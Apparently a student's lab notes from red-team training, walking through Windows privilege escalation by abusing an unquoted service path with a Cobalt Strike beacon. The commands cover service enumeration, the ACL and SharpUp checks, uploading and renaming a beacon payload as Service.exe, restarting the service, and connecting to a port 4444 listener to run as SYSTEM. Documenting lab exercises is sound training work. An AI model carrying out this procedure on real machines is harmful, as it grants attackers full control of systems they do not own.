Identifying services to perform unquoted service path on.
```shell
beacon> run wmic service get name, pathname
```
![[Pasted image 20230825130937.png]]
getting permissions of the vulnerable services path.
```shell
powershell Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl
```
Built in users can create files here.
![[Pasted image 20230825131257.png]]
Sharpup  doing a privesc check on places Unquoted Service Path could be
```shell
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit UnquotedServicePath
```
![[Pasted image 20230825131454.png]]
Generating Service Executable Payload on Cobalt Strike 
- utilizing tcp_local because it was recommended to use tcp_local for priv escs
- Use services exe's when interacting with services
![[Pasted image 20230825132418.png]]
Saved to C:\Payloads
![[Pasted image 20230825133138.png]]
CD'd to C:\Program Files
```powershell
beacon> cd C:\Program Files\Vulnerable Services
```
![[Pasted image 20230825133458.png]]
uploaded the shellcode to C:\Payloads\
```powershell
beacon> upload C:\Payloads\wkstn2_Quote_beacon_x64.exe
```
![[Pasted image 20230825133916.png]]
Renamed file to Service.exe to allow for the unquoted service paths
```powershell
beacon> mv wkstn2_Quote_beacon_x64.exe Service.exe
```
![[Pasted image 20230825134318.png]]
Stopped Service
```powershell
beacon> run sc stop VulnService1
```
![[Pasted image 20230825134448.png]]
Started Service
```powershell
beacon> run sc start VulnService1
```
![[Pasted image 20230825134536.png]]
Checking service status
- In order for Service to be started system must be restarted due to regular users unable to start services.
```powershell
beacon> run sc query VulnService1
```
![[Pasted image 20230825134642.png]]
Checking netstat to check for listener after rebooting computer.
- Port 4444 is the listener
```powershell
beacon> run netstat -anp tcp
```
![[Pasted image 20230825141119.png]]
Connecting to port 4444
```powershell
beacon> connect localhost 4444
```
![[Pasted image 20230825141236.png]]
On as System
![[Pasted image 20230825141331.png]]

![[Pasted image 20230825141544.png]]